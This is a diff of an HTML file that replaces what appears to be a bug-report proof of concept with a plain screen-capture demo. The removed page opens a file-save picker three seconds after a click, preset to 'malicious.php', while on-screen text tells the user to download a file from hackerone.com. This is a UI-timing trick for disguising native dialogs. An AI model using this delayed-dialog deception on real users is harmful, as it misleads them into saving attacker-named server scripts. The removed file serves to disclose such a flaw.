@@ -1,53 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Delayed File Save Picker</title>
-  <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: sans-serif;
-      background-color: #fafafa;
-      cursor: pointer;
-      user-select: none;
-    }
-    h1 {
-      color: #333;
-      text-align: center;
-      max-width: 400px;
-      padding: 20px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Screen Capture Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        video {
+            width: 80%;
+            max-width: 800px;
+            border: 2px solid #333;
+            margin-top: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-  <h1>Click me anywhere.<br>Browse to hackerone.com and download the file from HackerOne</h1>
+    <h1>Screen Capture using API</h1>
+    <button id="startCapture">Start Screen Capture</button>
+    <button id="stopCapture">Stop Capture</button>
+    <video id="video" autoplay></video>
 
-  <script>
-    document.addEventListener('click', async () => {
-      setTimeout(async () => {
-        if ('showSaveFilePicker' in window) {
-          try {
-            const handle = await window.showSaveFilePicker({
-              suggestedName: 'malicious.php',
-              types: [{
-                description: 'Text Files',
-                accept: {'text/plain': ['.php']},
-              }],
-            });
+    <script>
+        const video = document.getElementById('video');
+        const startButton = document.getElementById('startCapture');
+        const stopButton = document.getElementById('stopCapture');
+        let mediaStream = null;
 
-            const writable = await handle.createWritable();
-            await writable.write('This is a test file content.');
-            await writable.close();
-          } catch (err) {
-            // User canceled or error occurred — silently ignore
-          }
-        }
-      }, 3000);
-    }, { once: true });
-  </script>
+        startButton.addEventListener('click', async () => {
+            try {
+                // Use Screen Capture API to get display media
+                mediaStream = await navigator.mediaDevices.getDisplayMedia({
+                    video: {
+                        cursor: 'always'  // Options: 'always', 'motion', 'never'
+                    },
+                    audio: false  // Set to true if you want audio too
+                });
+                
+                video.srcObject = mediaStream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                };
+                
+                startButton.disabled = true;
+                stopButton.disabled = false;
+            } catch (error) {
+                console.error('Error capturing screen:', error);
+                alert('Failed to capture screen. Make sure to allow screen sharing.');
+            }
+        });
+
+        stopButton.addEventListener('click', () => {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+                startButton.disabled = false;
+                stopButton.disabled = true;
+            }
+        });
+    </script>
 </body>
 </html>
